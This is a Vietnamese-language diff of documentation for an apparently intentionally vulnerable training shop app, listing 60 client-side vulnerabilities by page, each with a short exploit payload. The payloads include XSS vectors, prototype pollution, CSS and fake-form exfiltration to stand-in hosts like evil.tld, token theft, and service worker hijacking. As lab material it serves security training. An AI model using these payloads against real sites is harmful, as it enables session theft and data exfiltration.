-| 6 | DOM Clobbering **[code]** | `/domxss` | gadget `window.config.allow` qua `<form id=config>` |
-| 7 | Prototype Pollution (client) **[code]** | `/clientauth` | `?__proto__[unlockAllFeatures]=true&__proto__[isAdmin]=true` → hidden panel mở |
-| 8 | CSTI **[code]** | `/product/:id` (chữ ký) | `<%= constructor.constructor("alert(1)")() %>` (lodash template trong browser) |
-| 9 | Open Redirect (client) **[code]** | `/redirects` | `?next=https://example.com` / `?next=//evil.tld` / `?next=javascript:...` |
-| 10 | DOM-based Open Redirect **[code]** | `/redirects` | `#https://evil.tld` → nút Go (sink `location.href = hash`) |
-| 11 | Client-Side Path Traversal **[code]** | `/pathdos` | `../index.html` · `../../api/debug/config` (URL normalization) |
-| 12 | HTML Injection **[code]** | `/injection` | `<form action="//evil.tld"><input name=pass type=password>` (fake login) |
-| 13 | CSS Injection **[code]** | `/injection` | `input[value^="a"] { background: url(//evil/log) }` — exfil qua attribute selector |
-| 14 | JavaScript Injection **[code]** | `/injection` | `new Function(userJS)()` — `document.title=...` hoặc mọi code |
-| 15 | Client-Side Request Forgery **[code]** | `/leaks` (CORS fetch) + `/injection` (script/img src) | fetch với `credentials:include` tới URL tùy ý — request kèm cookie |
-| 16 | Sensitive Data Exposure **[code]** | `/storage` (dump toàn bộ storage) | mọi token/creds hiển thị thẳng trên trang |
-| 17 | Hardcoded Credentials **[code]** | `/clientauth` + source bundle | `BACKUP_ADMIN = { user: "superadmin", password: "Sup3rS3cret!2024" }` trong JS |
-| 18 | API Key Exposure **[code]** | `index.html` + `/clientauth` | `window.VULN_CONFIG.MAPS_API_KEY`, key trong URL script, comment HTML `AKIA_...` |
-| 19 | Source Code Exposure **[code]** | `dist/assets/*.js.map` | `sourcemap: true` trong vite.config — tải `.map` → source gốc |
-| 20 | Source Map Exposure **[code]** | như #19 | mở DevTools → Sources (hoặc GET `/assets/index-xxx.js.map`) |
-| 21 | Insecure Local Storage **[code]** | `/storage` | JWT + plaintext creds lưu `vulnshop_jwt`, `vulnshop_creds` |
-| 22 | Insecure Session Storage **[code]** | `/storage` | `vulnshop_jwt_session` trong sessionStorage |
-| 23 | Insecure Cookie Configuration **[code]** | server: cookie `session` không HttpOnly/Secure/SameSite=None; client: `document.cookie` set | đọc qua `document.cookie` |
-| 24 | JWT Exposure **[code]** | `/storage` | JWT hiển thị + lưu localStorage + copy vào URL query |
-| 25 | Token Theft **[code]** | `/storage` + `3rd-party-widget.js` | exfil → `POST /api/telemetry`; attacker view: `GET /api/telemetry` |
-| 26 | Session Hijacking (client) **[code]** | `/storage` | copy cookie/session → dùng từ máy khác |
-| 27 | Clickjacking via iframe **[config]** | `/clickjack-demo.html` | như #5, gồm likejacking overlay |
-| 28 | PostMessage Vulnerabilities **[code]** | `/postmessage` + `/postmessage-sender.html` | listener không check `event.origin`; payload: string→innerHTML, `theme:<css>`, `{"__vulnSetUser":{"role":"admin"}}` |
-| 29 | Insecure CORS Handling (client) **[code]** | `/leaks` | fetch backend URL trực tiếp với credentials — server reflect mọi Origin → đọc chéo origin |
-| 30 | SRI Bypass **[code]** | `index.html` | `<script src="/3rd-party-widget.js">` không integrity — script hook fetch + loot storage |
-| 31 | Third-Party Script Injection **[code]** | `/injection` | `?` → `document.createElement('script'); s.src = userInput` |
-| 32 | Malicious Dependency Injection **[code]** | `/supply` + `/workers` | `import("/uploads/widget.js")` — upload qua #25/#26 rồi import |
-| 33 | Dependency Confusion **[doc]** | `/supply` | kịch bản `@vulnshop/*` + version 99.0.0; mitigations liệt kê trong trang |
-| 34 | Client-Side Authentication Bypass **[code]** | `/clientauth` | `?debug_login=1` hoặc set `localStorage.vulnshop_user = {"role":"admin"}` |
-| 35 | Client-Side Authorization Bypass **[code]** | `/clientauth` + `/admin` | gate `isClientAdmin()`/`canSeeHiddenPanel()` chỉ đọc localStorage/prototype |
-| 36 | UI Redressing **[config]** | `/clickjack-demo.html` | overlay căn vị trí nút thật, đổi nhãn |
-| 37 | Race Condition (client) **[code]** | `/clientauth` | nút double-submit không disable → 2 request song song |
-| 38 | WebSocket Client Vulnerabilities **[code]** | `/chat` | client broadcast token qua WS khi mở; message render innerHTML; `ws://` không check origin |
-| 39 | Web Worker Vulnerabilities **[code]** | `/workers` | `new Worker(URL.createObjectURL(new Blob([userCode])))` — chạy JS tùy ý ngoài main thread |
-| 40 | Service Worker Hijacking **[code]** | `/workers` | `navigator.serviceWorker.register(userPath)` — chain: upload `evil-sw.js` (#25) → register → MITM mọi fetch, persist qua restart |
-| 41 | Cache Poisoning (client) **[code]** | `/cache` | `caches.open("vulnshop-poison").put(userUrl, fakeResponse)` → app đọc cache trước |
-| 42 | Browser Cache Data Leakage **[config]** | `/cache` | `Cache-Control: public` trên data cá nhân (#38 server) + bfcache + autocomplete form |
-| 43 | Cross-Origin Information Leakage **[code]** | `/leaks` | fetch cross-origin đọc được nhờ #29; `window.opener` leak qua #45 |
-| 44 | XS-Leaks **[code]** | `/leaks` | login oracle: `<img src="/api/cache/profile/x.css">` onload=200 (đã login) / onerror=401 |
-| 45 | Tabnabbing **[code]** | `/leaks` → `/tabnab-attacker.html` | link `target=_blank` không `rel=noopener` → tab mới đổi `opener.location` thành trang phish |
-| 46 | Reverse Tabnabbing **[code]** | như #45 | cùng demo — so sánh link có/không `rel="noopener noreferrer"` |
-| 47 | Drag-and-Drop Vulnerabilities **[code]** | `/leaks` | drop zone render `dataTransfer.getData("text/html")` bằng innerHTML → XSS qua drag |
-| 48 | Clipboard Data Theft **[code]** | `/leaks` | `copy` event bị hijack (thay clipboard) + `paste` event log nội dung → `/api/telemetry` |
-| 49 | Autofill Data Theft **[code]** | `/leaks` | form ẩn offscreen với `autocomplete="cc-number"`... → JS đọc giá trị autofill |
-| 50 | Browser Fingerprinting **[code]** | `/leaks` | canvas hash + navigator/screen/timezone → beacon `/api/telemetry` |
-| 51 | Third-Party Tracking **[code]** | `tracker.js` (chạy từ index.html) | uid vĩnh viễn trong localStorage + pageview beacon + 1x1 pixel |
-| 52 | WebRTC IP Leakage **[code]** | `/leaks` | `RTCPeerConnection` + STUN Google → ICE candidates lộ IP local/public |
-| 53 | DNS Prefetch Leakage **[code]** | `index.html` + `/injection?prefetch=host` | `<link rel=dns-prefetch href="//attacker">` tĩnh + động từ query |
-| 54 | MIME Sniffing **[code]** | `/cache` + `/uploads-sniff/:name` | upload `shell.html` → load vào iframe dù Content-Type text/plain (không nosniff) |
-| 55 | Insecure CSP **[config]** | `index.html` meta | `default-src * 'unsafe-inline' 'unsafe-eval'` — mọi payload trên chạy tự do |
-| 56 | Mixed Content **[demo]** | `/injection` | load `http://` resource từ trang https — browser chặn, console cảnh báo |
-| 57 | Insecure Redirect Handling **[code]** | `/redirects` | inject `<meta http-equiv=refresh content="3;url=USER_INPUT">` |
-| 58 | DOM-based DoS **[code]** | `/pathdos` | nút Render N nodes hoặc URL `?rows=200000` — block main thread |
-| 59 | ReDoS (client) **[code]** | `/pathdos` | `/^(a|a?)+$/.test(input)` — 30×'a'+b ≈ 76s đơ tab |
-| 60 | Client-Side Logic Manipulation **[code]** | `/clientauth` | checkout tính total ở client, gửi `price` tự sửa (server tin #54); discount âm; feature flags localStorage |
+---
 
-## Ma trận trang ↔ lỗi (client)
+# Phần 2 — 60 lỗ hổng Frontend (Client-side) trong tính năng shop
+
+| # | Lỗ hổng | Tính năng | Payload / cách khai thác |
+|---|---------|-----------|--------------------------|
+| 1 | DOM-based XSS **[code]** | Build PC → "Nhập build từ link" (hash → innerHTML) | `#<form id=config><input name=allow><img src=x onerror=alert(1)>` |
+| 2 | Reflected XSS **[code]** | Cửa hàng `?q=`, Deals `?title=` | `?q=<img src=x onerror=alert(1)>` |
+| 3 | Stored XSS **[code]** | Review sản phẩm, tin nhắn ticket | `<img src=x onerror=alert(1)>` (đã seed) |
+| 4 | CSRF **[code]** | Ví chuyển tiền (Hồ sơ) qua GET | `/csrf-demo.html` |
+| 5 | Clickjacking **[config]** | thiếu XFO/frame-ancestors | `/clickjack-demo.html` |
+| 6 | DOM Clobbering **[code]** | Build PC import — gadget `window.config.allow` | `<form id=config><input name=allow>` |
+| 7 | Prototype Pollution (client) **[code]** | Admin `?__proto__[unlockAllFeatures]=true&__proto__[isAdmin]=true` | mergeDeep không lọc `__proto__` → hidden panel |
+| 8 | CSTI **[code]** | Chữ ký review; tóm tắt Build PC | `<%= constructor.constructor("alert(1)")() %>` |
+| 9 | Open Redirect (client) **[code]** | Staff portal `?next=` (nếu dùng) + server `/api/net/redirect?url=` | `?url=https://evil.tld` |
+| 10 | DOM-based Open Redirect **[code]** | hash → `location.href` (Build PC import / Redirects sink) | `#https://evil.tld` |
+| 11 | Client-Side Path Traversal **[code]** | Checkout "tải catalog offline" — `fetch('./content/'+input)` | `../index.html` · `../../api/internal/config` |
+| 12 | HTML Injection **[code]** | Bio ở Hồ sơ (render raw HTML) | `<form action="//evil"><input name=pass type=password>` |
+| 13 | CSS Injection **[code]** | Theme customizer ở Hồ sơ → `<style>` | `input[value^="4"] { background: url(//evil/log) }` |
+| 14 | JavaScript Injection **[code]** | Admin "vendor tools" + Build PC benchmark | `new Function(userJS)()` |
+| 15 | Client-Side Request Forgery **[code]** | Stores CORS tool + script/img src theo input | fetch credentials=include tới URL bất kỳ |
+| 16 | Sensitive Data Exposure **[code]** | Sessions — dump toàn bộ storage | mọi token/creds hiển thị |
+| 17 | Hardcoded Credentials **[code]** | Admin vendor panel — `BACKUP_ADMIN` trong bundle | `superadmin / Sup3rS3cret!2024` |
+| 18 | API Key Exposure **[code]** | `window.VULN_CONFIG`, key trong URL script index.html, comment HTML | DevTools → Sources |
+| 19 | Source Code Exposure **[code]** | `dist/assets/*.js.map` (sourcemap prod) | tải `.map` → source gốc |
+| 20 | Source Map Exposure **[code]** | như #19 | DevTools → Sources |
+| 21 | Insecure Local Storage **[code]** | Staff JWT login → `vulnshop_jwt` + plaintext creds | đọc bằng XSS |
+| 22 | Insecure Session Storage **[code]** | `vulnshop_jwt_session` (Sessions page) | tab-scoped leak |
+| 23 | Insecure Cookie Configuration **[code]** | cookie `session` server (no HttpOnly/Secure) + client `document.cookie` | đọc/ghi qua XSS |
+| 24 | JWT Exposure **[code]** | Staff portal — JWT hiển thị + localStorage + URL param | copy token |
+| 25 | Token Theft **[code]** | Sessions "Exfiltrate" + 3rd-party-widget + Support WS leak | `POST /api/telemetry`; attacker view `GET /api/telemetry` |
+| 26 | Session Hijacking **[code]** | Sessions — copy cookie dùng máy khác | `?session=<token>` |
+| 27 | Clickjacking via iframe **[config]** | `/clickjack-demo.html` | overlay nút |
+| 28 | PostMessage Vulnerabilities **[code]** | Notifications bridge + Support notification bridge | `window.postMessage('<img src=x onerror=alert(1)>', '*')` · `{"__vulnSetUser":{"role":"admin"}}` |
+| 29 | Insecure CORS Handling **[code]** | Stores CORS tool vs backend reflect Origin | fetch backend URL trực tiếp |
+| 30 | SRI Bypass **[code]** | index.html load `/3rd-party-widget.js` không integrity | script hook fetch + loot storage |
+| 31 | Third-Party Script Injection **[code]** | Admin vendor script theo input | `document.createElement('script'); s.src=userInput` |
+| 32 | Malicious Dependency Injection **[code]** | Admin `import(vendorModule)` — upload qua ticket rồi import | `/uploads/widget.js` |
+| 33 | Dependency Confusion **[doc]** | Admin note — `@vulnpc/*` + version 99.0.0 | internal registry allowlist |
+| 34 | Client-Side Authentication Bypass **[code]** | Admin `?debug_login=1` / `?debug_user=` | set localStorage user |
+| 35 | Client-Side Authorization Bypass **[code]** | Admin guard client-only + `canSeeHiddenPanel()` | localStorage role / pollution |
+| 36 | UI Redressing **[config]** | `/clickjack-demo.html` | overlay căn nút thật |
+| 37 | Race Condition (client) **[code]** | Giỏ hàng — nút coupon double-submit không disable | 2 request song song PCLOVE50 |
+| 38 | WebSocket Client Vulnerabilities **[code]** | Support live chat — token leak khi connect, innerHTML | `<img src=x onerror=alert(1)>` |
+| 39 | Web Worker Vulnerabilities **[code]** | Build PC benchmark — Worker từ Blob user code | `fetch('/api/telemetry',{method:'POST',body:...})` |
+| 40 | Service Worker Hijacking **[code]** | Offline center — register SW theo path | upload `evil-sw.js` → register → MITM mọi fetch |
+| 41 | Cache Poisoning (client) **[code]** | Offline center — Cache API put response giả theo URL | app đọc `caches.match` trước network |
+| 42 | Browser Cache Data Leakage **[config]** | Offline center notes + `/api/cache/profile/*.css` public | bfcache + HTTP cache |
+| 43 | Cross-Origin Information Leakage **[code]** | Stores CORS tool + `window.opener` leak (#45) | đọc cross-origin nhờ #29 |
+| 44 | XS-Leaks **[code]** | Wishlist "kiểm tra quà" — img onload=200/onerror=401 | login-state oracle |
+| 45 | Tabnabbing **[code]** | Sản phẩm/Deals — `target=_blank` không rel | `/tabnab-attacker.html` đổi `opener.location` |
+| 46 | Reverse Tabnabbing **[code]** | như #45 (so sánh có/không rel) | |
+| 47 | Drag-and-Drop **[code]** | Stores — drop zone render raw HTML | kéo payload HTML → innerHTML |
+| 48 | Clipboard Data Theft **[code]** | Deals + Stores — copy hijack + paste logger | Ctrl+C bị thay nội dung |
+| 49 | Autofill Data Theft **[code]** | Checkout — autocomplete bật + form ẩn offscreen | "Đọc form ẩn" → cc/email/tel |
+| 50 | Browser Fingerprinting **[code]** | Stores "ưu đãi cá nhân hoá" — canvas hash + beacon | `/api/telemetry` |
+| 51 | Third-Party Tracking **[code]** | `tracker.js` từ index.html — uid + pageview beacon | `vulnshop_track_uid` |
+| 52 | WebRTC IP Leakage **[code]** | Stores speed test — STUN Google ICE candidates | IP local/public |
+| 53 | DNS Prefetch Leakage **[code]** | Stores `?prefetch=` + `<link>` tĩnh trong index.html | DNS log attacker host |
+| 54 | MIME Sniffing **[code]** | Offline center — `/uploads-sniff/:name` iframe/img | upload shell.html |
+| 55 | Insecure CSP **[config]** | index.html meta `default-src * 'unsafe-inline' 'unsafe-eval'` | mọi payload chạy tự do |
+| 56 | Mixed Content **[demo]** | Stores banner http:// | browser chặn, xem console |
+| 57 | Insecure Redirect Handling **[code]** | Deals — inject `<meta refresh>` tới input | `5;url=attacker` |
+| 58 | DOM-based DoS **[code]** | Compare `?rows=200000` + nút render N hàng | block main thread, share-able URL |
+| 59 | ReDoS (client) **[code]** | Compare serial check — `/^(a|a?)+$/` trên main thread | 30×'a'+b ≈ 76s đơ tab |
+| 60 | Client-Side Logic Manipulation **[code]** | Giỏ hàng sửa giá từng dòng; Build PC discount/total; checkout giá client | price=0.01, discount=100000 |
+
+## Ma trận trang ↔ lỗi chính (client)
 
 ```
-/              #2, #8 reflected/stored feed          /postmessage   #28
-/product/:id   #3, #8, #31                          /workers       #39, #40, #32
-/orders        #11 (IDOR UI) + race nút             /leaks         #29, #43-#52
-/profile       #44 (data exposure), #51             /pathdos       #11, #58, #59
-/upload        #25, #26, #54 (nguồn payload)        /cache         #41, #42, #54
-/admin         #12, #34, #35                        /supply        #30, #32, #33
-/chat          #38, #25                             /storage       #16, #21-#26
-/legacy        #15-#21, #45-#46, #66-#67            /injection     #12-#14, #31, #53, #56
-/domxss        #1, #6, #59                          /redirects     #9, #10, #57
-/lab           backend payloads                     /clientauth    #7, #17, #18, #34-#37, #60
-/oauth-demo    #62                                  /debug         #42, #43, #70
+/             #2 #9 #32                /support      #3 #25 #28 #60 #68
+/shop         #1 #2 #43(NoSQL #2)      /profile      #9 #12 #13 #44 #51
+/product/:id  #3 #31 #45 #46           /admin        #7 #12 #13 #17 #18 #31 #32 #33 #34 #35 #50
+/cart         #37 #53 #54 #60          /sessions     #16 #21-26
+/checkout     #11 #44 #49 #54          /stores       #29 #43 #47 #48 #50 #52 #53 #56
+/orders       #11 #22 #53 #54          /offline      #40 #41 #42 #54
+/build        #1 #2 #6 #31 #39 #59 #60 /notifications #28
+/compare      #58 #59 #43              /legacy       #17-21 #24 #52 #61-63 #66 #67
+/deals        #2 #32 #45 #48 #57       /internal     #37 #38 #41 #42 #43 #45 #47 #50 #67 #70
+/wishlist     #6 #44 #49
 ```
